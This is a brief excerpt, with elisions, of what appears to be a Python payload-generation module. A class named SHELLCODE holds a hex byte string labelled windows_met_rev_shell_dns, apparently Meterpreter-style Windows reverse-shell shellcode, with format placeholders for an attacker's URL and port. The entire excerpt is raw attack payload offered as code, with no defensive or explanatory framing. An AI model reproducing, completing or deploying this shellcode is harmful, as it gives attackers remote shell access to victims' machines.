...
class SHELLCODE(object):
    ...
    windows_met_rev_shell_dns = (
        ...
        "\xea\x0f\xdf\xe0\xff\xd5\x97\xe8\x40\x00\x00\x00%s" #url
        "\x00\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x00\x68\xa9\x28\x34\x80\xff\xd5\x8b\x40\x1c\x6a\x05\x50\x68"
        "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61" #port
